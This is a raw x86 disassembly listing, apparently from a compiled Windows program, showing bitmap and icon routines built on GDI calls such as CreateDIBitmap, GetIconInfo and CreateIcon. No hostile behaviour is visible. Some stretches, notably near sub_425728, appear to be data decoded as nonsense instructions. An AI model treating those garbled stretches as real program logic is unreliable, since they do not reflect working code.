movzx edx [ edx + 0xe ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_4243f0
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0xe ]
call sub_4243d0
mov esi eax
push 0x0
call GetDC
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_424bf4
push [ fs : edx ]
mov [ fs : edx ] esp
mov edi [ ebp - 0x4 ]
mov eax edi
add eax 0x28
mov edx esi
shl edx 0x2
add eax edx
mov [ ebp - 0x14 ] eax
push 0x0
mov eax [ ebp - 0x4 ]
push edi
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_424260
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_424b1a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_424270
mov [ ebx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424b21
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
call sub_424164
sub_424b21
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
add [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov bx 0x1
mov [ eax + 0xe ] bx
mov eax [ ebp - 0x4 ]
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_4243f0
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x20 ] 0x2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] 0x2
mov eax [ ebp - 0x4 ]
add eax 0x28
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] 0xffffff
push 0x0
mov ebx [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_424260
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_424bd4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0xc ]
call sub_424270
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424bdb
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
sub_424c10
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor ecx ecx
mov cl [ edx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
sub ecx eax
xor ebx ebx
mov bl [ edx + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub ebx [ edx + 0x4 ]
mov esi [ ebp - 0x4 ]
movzx esi [ esi ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub esi eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov edi eax
mov eax esi
cdq
xor eax edx
sub eax edx
cmp edi eax
jg r-xdata
xor eax eax
jmp r-xdata
test ecx ecx
jle r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
cdq
xor eax edx
sub eax edx
mov ecx eax
mov eax [ ebp - 0x8 ]
cdq
xor eax edx
sub eax edx
cmp ecx eax
jg r-xdata
cmp esi ecx
jl r-xdata
test ebx ebx
jle r-xdata
mov al 0x1
cmp ebx [ ebp - 0x8 ]
jle r-xdata
sub_424ca0
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0xc ]
shl eax 0x4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
call sub_407ee0
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_424f97
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebx ]
or eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
mov [ eax ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
push 0xb
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
push 0xc
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
xor edx edx
push ebp
push sub_424d89
push [ fs : edx ]
mov [ fs : edx ] esp
push 0xe
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xc
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax ebx
cmp ax 0x8
jbe r-xdata
call sub_424164
push 0x0
call GetDC
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424d90
mov eax [ ebp - 0x28 ]
push eax
push 0x0
call ReleaseDC
retn
sub_424d90
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x10 ]
movzx eax [ eax + 0x2 ]
call sub_424c04
mov [ ebp - 0x20 ] eax
mov edi [ ebp - 0xc ]
dec edi
test edi edi
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax eax
mov edx [ ebp - 0x10 ]
lea eax [ edx + eax * 8 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x40 ]
mov eax [ eax + 0x8 ]
call sub_407ee0
mov [ ebp - 0x2c ] eax
xor eax eax
push ebp
push sub_424f77
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
add eax [ ebp + 0x10 ]
sub edx eax
mov cx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x40 ]
mov ecx [ eax + 0x8 ]
mov ebx [ ebp - 0x2c ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x38 ]
lea edx [ ebp - 0x34 ]
mov eax ebx
call sub_424a48
lea eax [ ebp - 0x70 ]
push eax
push 0x18
mov eax [ ebp - 0x38 ]
push eax
call GetObjectA
lea eax [ ebp - 0x58 ]
push eax
push 0x18
mov eax [ ebp - 0x34 ]
push eax
call GetObjectA
mov ebx [ ebp - 0x64 ]
imul ebx [ ebp - 0x68 ]
movzx eax [ ebp - 0x60 ]
imul ebx eax
mov eax [ ebp - 0x4c ]
imul [ ebp - 0x50 ]
movzx edx [ ebp - 0x48 ]
imul edx
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
add eax ebx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
call sub_407ee0
mov [ ebp - 0x30 ] eax
xor eax eax
push ebp
push sub_424f54
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebp - 0x30 ]
mov esi [ ebp - 0x30 ]
add esi ebx
push edi
push ebx
mov eax [ ebp - 0x38 ]
push eax
call GetBitmapBits
push esi
mov eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x34 ]
push eax
call GetBitmapBits
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
push esi
push edi
mov al [ ebp - 0x46 ]
push eax
mov al [ ebp - 0x48 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push eax
mov eax [ rw-data ]
push eax
call CreateIcon
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424f5b
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x30 ]
call sub_4027d4
retn
call sub_4241b8
inc esi
dec edi
jne r-xdata
cmp ebx [ ebp - 0x20 ]
jl r-xdata
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
movzx eax [ edx + eax * 8 + 0x2 ]
call sub_424c04
mov ebx eax
cmp ebx [ ebp - 0x1c ]
jg r-xdata
push ebp
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
lea edx [ edx + eax * 8 ]
mov eax [ ebp - 0x24 ]
add eax eax
mov ecx [ ebp - 0x10 ]
lea eax [ ecx + eax * 8 ]
call sub_424c10
pop ecx
test al al
je r-xdata
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] ebx
sub_424fc0
push ebx
push esi
push edi
add esp 0xffffffac
mov esi ecx
mov ebx edx
xor edx edx
mov [ esp + 0x18 ] edx
push esp
push 0x54
push eax
call GetObjectA
test eax eax
jne r-xdata
cmp eax 0x40
jl r-xdata
call sub_424140
jmp r-xdata
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402c58
mov [ ebx ] 0x28
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
cmp [ esp + 0x18 ] 0x28
jb r-xdata
mov eax esi
sub eax 0x2
je r-xdata
mov [ ebx + 0xe ] 0x1
jmp r-xdata
dec eax
sub eax 0xe
jb r-xdata
push esi
mov edi ebx
lea esi [ esp + 0x1c ]
mov ecx 0xa
[ edi ] [ esi ]
pop esi
jmp r-xdata
mov [ ebx + 0xc ] 0x1
mov eax [ ebx + 0x20 ]
cmp eax [ ebx + 0x24 ]
jae r-xdata
mov [ ebx + 0xe ] 0x4
mov [ ebx + 0x20 ] esi
jmp r-xdata
sub eax 0xf0
jb r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov [ ebx + 0x24 ] eax
mov [ ebx + 0xe ] 0x8
mov [ ebx + 0x20 ] esi
jmp r-xdata
jmp r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_4243f0
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov ax [ esp + 0x12 ]
imul [ esp + 0x10 ]
mov [ ebx + 0xe ] ax
sub_4250a4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi ecx
mov ebx edx
lea edx [ ebp - 0x28 ]
mov ecx [ ebp + 0x8 ]
call sub_424fc0
mov ax [ ebp - 0x1a ]
cmp ax 0x8
jbe r-xdata
mov edx [ ebp - 0x8 ]
test edx edx
jne r-xdata
mov [ ebx ] 0x28
test [ ebp - 0x18 ] 0x3
je r-xdata
mov eax edx
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
mov ecx eax
mov eax 0x1
shl eax cl
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx ] 0xc
jmp r-xdata
sub_425110
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov edx ebx
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_424fc0
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4251ad
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
push 0x0
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x8 ]
push eax
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call GetDIBits
test eax eax
setne [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4251b4
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
push edi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
sub_4251e4
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
lea eax [ ebp - 0x2a ]
xor ecx ecx
mov edx 0x6
call sub_402c58
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x10
call sub_402c58
lea eax [ ebp - 0x44 ]
push eax
push esi
call GetIconInfo
call sub_4251d8
xor edx edx
push ebp
push sub_4253d2
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x2
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_4250a4
push 0x10
lea ecx [ ebp - 0x14 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x34 ]
call sub_4250a4
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_4253ab
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
call sub_407ee0
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
call sub_407ee0
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0xc ]
call sub_407ee0
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
call sub_407ee0
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x1c ]
push eax
push 0x2
mov ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x38 ]
call sub_425110
mov eax [ ebp - 0x24 ]
push eax
push 0x10
mov ecx [ ebp - 0x20 ]
xor edx edx
mov eax [ ebp - 0x34 ]
call sub_425110
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x26 ] 0x1
lea edx [ ebp - 0x2a ]
mov ecx 0x6
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov esi [ ebp - 0x20 ]
mov eax esi
mov dl [ eax + 0x4 ]
mov [ ebp - 0x54 ] dl
mov dl [ eax + 0x8 ]
mov [ ebp - 0x53 ] dl
mov dx [ eax + 0xc ]
imul dx [ eax + 0xe ]
mov [ ebp - 0x52 ] dx
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] 0x16
lea edx [ ebp - 0x54 ]
mov ecx 0x10
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax esi
mov edx [ eax + 0x8 ]
add [ eax + 0x8 ] edx
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x14 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4253b2
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_4027d4
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x24 ]
call sub_4027d4
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
call sub_4027d4
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
call sub_4027d4
retn
mov eax [ ebp - 0xc ]
add eax 0x16
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
lea edx [ ebp - 0x30 ]
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_4253b2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4253d9
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
retn
sub_4253e0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_40321c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax esi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_425430
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x1c ]
xor al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_425488
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x44 ]
push eax
push ebp
call sub_425430
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4254d1
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_403194
mov edi eax
mov eax esi
call sub_403194
cmp edi eax
je r-xdata
mov [ ebp - 0x1 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
jmp r-xdata
mov al 0x1
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42560b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4255ee
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_40800c
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4255f5
mov al 0x1
sub_425624
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41c32c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42566c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425673
mov eax [ ebp - 0x4 ]
call sub_40324c
retn
sub_425678
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_4256ac
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41c32c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4256f7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4256fe
mov eax [ ebp - 0x4 ]
call sub_40324c
retn
sub_425728
push cs
or edx [ esi + eax * 2 + 0x69 ]
insb
inc esi
outsd
jb r-xdata
dec eax
movsb [ edi ] [ esi ]
inc ecx
add [ eax ] dl
mov eax [ 0xffffffffa18c0041 ]
inc ecx
add [ eax ] dl
push esp
inc esi
imul ebp [ ebp + 0x46 ] 0x616d726f
je r-xdata
popad
je r-xdata
dec ebp
clc
dec esp
imul esi [ ebx + 0x74 ] 0x5500408d
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
test dl dl
je r-xdata
adc [ eax ] al
or [ eax ] al
add [ eax ] al
lea eax [ eax ]
pushfd
push edi
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edx * 2 + 0x100042 ] ch
add [ eax ] al
sar [ esi + 0x41 ] 0x1
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
hlt
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah dh
adc [ eax ] al
add al 0x0
add [ eax ] al
hlt
mov edx r-xdata
mov eax esi
call sub_425940
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax esi
call sub_425940
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x10 ]
mov edx r-xdata
mov eax esi
call sub_425940
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4258a4
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403fc0
retn
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_42589d
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_40321c
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
call sub_425940
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x8 ]
add esp 0xfffffff0
call sub_403570
sub_4257c0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_42589d
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_40321c
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
call sub_425940
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x8 ]
mov edx r-xdata
mov eax esi
call sub_425940
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax esi
call sub_425940
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x10 ]
mov edx r-xdata
mov eax esi
call sub_425940
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4258a4
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403fc0
retn
add esp 0xfffffff0
call sub_403570
sub_425940
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4259c3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax 0x10
call sub_404d70
mov esi eax
mov ebx esi
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4080d8
mov edx [ ebp - 0xc ]
lea eax [ ebx + 0x4 ]
call sub_403ff0
mov eax [ ebp + 0x8 ]
mov [ ebx ] eax
lea eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_403ff0
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov edx esi
mov eax edi
call sub_41a0dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4259ca
lea eax [ ebp - 0xc ]
call sub_403f9c
retn
sub_4259d4
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_425a52
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_41a238
mov esi [ eax ]
lea edx [ ebp - 0x108 ]
mov eax esi
call sub_40319c
lea edx [ ebp - 0x108 ]
lea eax [ ebp - 0x8 ]
call sub_404200
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_4043a8
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425a59
lea eax [ ebp - 0x8 ]
call sub_403f9c
retn
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_425ac4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ esi + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ esi + 0x8 ] eax
mov ecx [ r-xdata ]
mov dx 0x3
mov eax esi
call sub_425b70
mov ecx [ r-xdata ]
mov dx 0xe
mov eax esi
call sub_425b70
mov ecx [ r-xdata ]
mov dx 0x2
mov eax esi
call sub_425b70
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax esi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_425b44
push ebx
push esi
call sub_4035d8
mov ebx edx
